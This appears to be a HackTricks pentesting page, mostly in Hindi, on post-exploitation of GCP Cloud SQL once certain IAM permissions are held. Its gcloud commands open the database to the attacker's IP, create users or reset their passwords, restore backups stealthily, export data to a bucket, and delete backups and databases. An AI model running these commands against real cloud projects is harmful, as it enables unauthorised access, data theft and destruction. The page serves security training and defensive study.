# GCP - Cloud SQL Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Cloud SQL

Cloud SQL के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
../gcp-services/gcp-cloud-sql-enum.md
{{#endref}}

### `cloudsql.instances.update`, ( `cloudsql.instances.get`)

Databases से कनेक्ट करने के लिए आपको केवल **database port तक access** और **username** और **password** पता होना चाहिए; IAM की कोई requirement नहीं है। इसलिए, यदि database का **public IP** है तो एक आसान तरीका है **allowed networks** को अपडेट करके अपने **IP address** को access करने की अनुमति देना।

<details>

<summary>अपने IP को अनुमति दें और database से कनेक्ट करें</summary>
```bash
# Use --assign-ip to make the database get a public IPv4
gcloud sql instances patch $INSTANCE_NAME \
--authorized-networks "$(curl ifconfig.me)" \
--assign-ip \
--quiet

mysql -h <ip_db> # If mysql

# With cloudsql.instances.get you can use gcloud directly
gcloud sql connect mysql --user=root --quiet
```
</details>

आप **`--no-backup`** का उपयोग करके डेटाबेस के बैकअप को **बाधित** भी कर सकते हैं।

इन आवश्यकताओं को देखकर मैं पूरी तरह सुनिश्चित नहीं हूँ कि अनुमति **`cloudsql.instances.connect`** और **`cloudsql.instances.login`** किसके लिए हैं। अगर आप जानते हैं तो एक PR भेजें!

### `cloudsql.users.list`

डेटाबेस के सभी उपयोगकर्ताओं की **सूची** प्राप्त करें:

<details>

<summary>डेटाबेस उपयोगकर्ताओं की सूची</summary>
```bash
gcloud sql users list --instance <intance-name>
```
</details>

### `cloudsql.users.create`

यह permission डेटाबेस के अंदर **नया user बनाने** की अनुमति देता है:

<details>

<summary>डेटाबेस user बनाएँ</summary>
```bash
gcloud sql users create <username> --instance <instance-name> --password <password>
```
</details>

### `cloudsql.users.update`

यह अनुमति डेटाबेस के अंदर **user को अपडेट** करने देती है। उदाहरण के लिए, आप इसका पासवर्ड बदल सकते हैं:

<details>

<summary>user का पासवर्ड अपडेट करें</summary>
```bash
gcloud sql users set-password <username> --instance <instance-name> --password <password>
```
</details>

### `cloudsql.instances.restoreBackup`, `cloudsql.backupRuns.get`

बैकअप्स में **पुरानी संवेदनशील जानकारी** हो सकती है, इसलिए इन्हें जांचना दिलचस्प होता है.\
**डेटाबेस के अंदर बैकअप पुनर्स्थापित करें:**

<details>

<summary>डेटाबेस बैकअप पुनर्स्थापित करें</summary>
```bash
gcloud sql backups restore <backup-id> --restore-instance <instance-id>
```
</details>

इसे अधिक stealth तरीके से करने के लिए यह सिफारिश की जाती है कि एक नया SQL instance बनाकर वहां डेटा पुनर्प्राप्त करें बजाय कि वर्तमान में चल रहे डेटाबेस में।

### `cloudsql.backupRuns.delete`

यह अनुमति बैकअप हटाने की अनुमति देती है:

<details>

<summary>बैकअप हटाएँ</summary>
```bash
gcloud sql backups delete <backup-id> --instance <instance-id>
```
</details>

### `cloudsql.instances.export`, `storage.objects.create`

**डेटाबेस निर्यात करें** Cloud Storage Bucket में ताकि आप वहां से इसे एक्सेस कर सकें:

<details>

<summary>डेटाबेस को bucket में निर्यात करें</summary>
```bash
# Export sql format, it could also be csv and bak
gcloud sql export sql <instance-id> <gs://bucketName/fileName> --database <db>
```
</details>

### `cloudsql.instances.import`, `storage.objects.get`

**Cloud Storage Bucket से डेटाबेस आयात करें (overwrite):**

<details>

<summary>बकेट से डेटाबेस आयात करें</summary>
```bash
# Import format SQL, you could also import formats bak and csv
gcloud sql import sql <instance-id> <gs://bucketName/fileName>
```
</details>

### `cloudsql.databases.delete`

db instance से डाटाबेस हटाएँ:

<details>

<summary>डाटाबेस हटाएँ</summary>
```bash
gcloud sql databases delete <db-name> --instance <instance-id>
```
</details>

{{#include ../../../banners/hacktricks-training.md}}
